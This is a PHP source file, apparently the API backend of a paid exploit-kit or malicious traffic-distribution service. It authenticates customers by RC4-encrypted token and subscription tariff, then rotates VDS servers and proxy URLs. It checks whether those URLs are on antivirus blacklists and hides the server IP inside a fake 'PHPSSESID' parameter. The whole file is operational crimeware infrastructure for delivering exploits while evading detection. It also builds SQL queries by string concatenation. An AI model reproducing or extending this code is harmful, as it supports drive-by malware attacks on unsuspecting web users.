<?php
if (!isset($_GET['apitoken']) || empty($_GET['apitoken'])) {
	exit('no apitoken');
} else {
	$apitoken = $_GET['apitoken'];
}

header('Content-Type:text/html;charset=UTF-8', true);

function errorHandler($code, $message, $file, $line) {
	debug(array('Error'=>$code,'Message'=>$message,'In file'=>$file,'On line'=>$line));
	exit();
}

function fatalErrorShutdownHandler() {
	$last_error = error_get_last();
	if ($last_error['type'] === E_ERROR) {
	// fatal error
		errorHandler(E_ERROR, $last_error['message'], $last_error['file'], $last_error['line']);
	}
}

set_error_handler('errorHandler');
register_shutdown_function('fatalErrorShutdownHandler');


include_once('config.php');			// берем конфиг
include_once('gears/functions.php');	// подключаем функции
include_once('gears/di.php');			// подключаем класс библиотеки класов
include_once('gears/db.php');			// подключаем класс базы


// создаем подключение к базе
cdim('db','connect',$config);


// забираем из базы опции и кладем их в конфиг
$options = cdim('db','query',"SELECT * FROM options");

// кладем в конфиг все что забрали из базы (все опции)
if (isset($options)) foreach($options as $k=>$v) {
	$config['options'][$v->option_name]=$v->option_value;
}





// смотрим тариф
function checkTarif($user_id) {
	$tarifExp = cdim('db','query',"SELECT * FROM `tarif` WHERE user_id = ".$user_id);
	if (isset($tarifExp)) {
		if (!is_numeric($tarifExp[0]->len) || $tarifExp[0]->len < time() || $tarifExp[0]->len ==0) {
			exit('out of date');
		}
	} else {
		exit('out of date');
	}
}





// его ли это поток
function checkToken($user_id, $flow_id) {
	$lastToken = cdim('db','query',"SELECT * FROM `flows` WHERE `id` = ".$flow_id." AND `user_id` = ".$user_id);
	if (!isset($lastToken)) {
		exit('Error in token or ident');
	}

	// берем инфу о пользователе
	$user = cdim('db','query',"SELECT * FROM `users` WHERE `id` = ".$user_id);
	if (!isset($user)) {
		exit('Error in token or ident');
	} else {
		return $user[0];
	}
}
	

// смотрим когда последний раз меняли токен для потока и отдаем токен
function getToken($flow_id) {
	global $config, $user;
	$lastToken = cdim('db','query',"SELECT * FROM `flows` WHERE `id` = ".$flow_id);
	if (isset($lastToken)) {
		if ($lastToken[0]->last_token < time()) {
			$tokenTime = time()+$config['options']['tokenTTL'];
			cdim('db','query',"UPDATE `flows` SET `last_token` = ". $tokenTime . " WHERE `id` = ".$flow_id);
		} else {
			$tokenTime = $lastToken[0]->last_token;
		}
		
		return md5($tokenTime.$user->id.$user->user_login);
		
	} else {
		exit('Hacking attempt!');
	}
}




// выбираем vds	
function selectVDS() {
	$vds = cdim('db','query',"SELECT * FROM `vds`");
	if (isset($vds)) {
		$vdsList = Array();
		foreach($vds as $k=>$v) {
			$vdsList[] = $v;
		}
		return $vdsList[rand(0,count($vdsList)-1)]->ip;
	} else {
		exit("no vds");
	}
}






	
// выбираем прокси, смотрим как давно оно чекалось, если надо чекаем
function selectPROXY() {
	$proxy = cdim('db','query',"SELECT * FROM `proxy`");
	if (isset($proxy)) {
		$proxyList = Array();
		foreach($proxy as $k=>$v) {
			$proxyList[] = $v;
		}
		//return $proxyList[rand(0,count($proxyList)-1)];
		return $proxyList[0];
	} else {
		exit("no proxy");
	}
}





// CHECK PROXY FOR BAN

include('./manage/gears/checkAvURLCLASS.php');
$checkURL = new checkURL();

// malicious http://vb4dsa.net/joomla/routine/decrease_audience-hereby.php
function checkURL4BAN($selectedPROXY) {
	global $checkURL, $config;
	$url = parse_url($selectedPROXY);
	$path = pathinfo($url['path']);
	if (isset($url['scheme'])) {
		// смотрим сайт и путь
		//$url = $url['scheme'].'://'.$url['host'].str_replace('//','/',$path['dirname']);
		$url = $selectedPROXY;
		// чекаем
		$res = $checkURL->is_ok($url);
		// тут может вылетать cant resolve domain от check4u так что проверим на isset и если что запишем в лог
		if (!isset($res['inBan'])) logError($res['msg']);
		if (isset($res['inBan']) && $res['inBan']>$config['options']['exploit_count_fail']) return false;
		return array('type'=>'success','msg'=>$res['msg'],'full'=>$res['full'], 'proxyURL'=>$selectedPROXY);
	} else {
		exit('Something wrong with proxy scheme!');
	}
}
	

function getPROXY() {
	$proxy = selectPROXY();
	/*
	// если ссылка на прокси не проверялась больше часа то проверяем (это подстраховка если cron отвалится)
	if ($proxy->last_check<intval(time()-60*60))
	  {
		$results = checkURL4BAN($proxy->url);
		if ($results === false)
		{
			// ссылка в блеке
			// убиваем ссылку
			cdim('db','query',"DELETE FROM `proxy` WHERE `id` = '".$proxy->id."';");
			// еще раз пытаемся подобрать ссылку
			$proxy = getPROXY();
		} else {
			// проверка чистая
			// обновим последнюю проверку
			cdim('db','query',"UPDATE `proxy` SET `last_check` = ".time()." WHERE `id` = ".$proxy->id.";");
		}
	  }
	*/
	return $proxy;
}


include('gears/RC4.php');
$rc4 = new RC4;

$detoken = unserialize($rc4->crypt_str($config['options']['rc4key'],base64url_decode($apitoken)));

$user_id = intval(trim($detoken[0]));
$flow_id = intval(trim($detoken[1]));


checkTarif($user_id);
$user = checkToken($user_id, $flow_id);
$token = getToken($flow_id);


/***** BLOCK ALL, witchout this list ******/
    $user_ip_addr = $_SERVER['REMOTE_ADDR'];

    $block_list_way = 'manage/addl/block_list_'.$user_id.'.lst';
    if (file_exists($block_list_way))
      {
      $file_arr = array();
      $file_data = file_get_contents($block_list_way);
      $file_arr = unserialize($file_data);

      if (isset($file_arr[$flow_id]))
	{
        if ((count($file_arr[$flow_id]) > 0) && !in_array($user_ip_addr, $file_arr[$flow_id]))
	  die('..');
	}
      }
/***** BLOCK ALL, witchout this list ******/

$cache_fileway = 'proxy_vds_cache';

$cfile = file_get_contents($cache_fileway);
if ($cfile)
  {
  $kdata = unserialize($cfile);
  $cache_time = isset($kdata[$user_id][$flow_id]['time']) ? $kdata[$user_id][$flow_id]['time'] : false;
  if ($cache_time+60 < time())
    {
    $selectedVDS = selectVDS();
    $selectedPROXY = getPROXY();    

    $selectedPROXYurl = $selectedPROXY->url;
    $kdata[$user_id][$flow_id]['vds'] = $selectedVDS;
    $kdata[$user_id][$flow_id]['proxy'] = $selectedPROXYurl;
    $kdata[$user_id][$flow_id]['time'] = time();
    file_put_contents($cache_fileway, serialize($kdata));
    }
    else
    {
    $selectedVDS = $kdata[$user_id][$flow_id]['vds'];
    $selectedPROXYurl = $kdata[$user_id][$flow_id]['proxy'];
    }
  }


echo $selectedPROXYurl.'?PHPSSESID='. base64url_encode($rc4->crypt_str($config['options']['rc4key'],$selectedVDS)).'|'.base64url_encode($token);




?>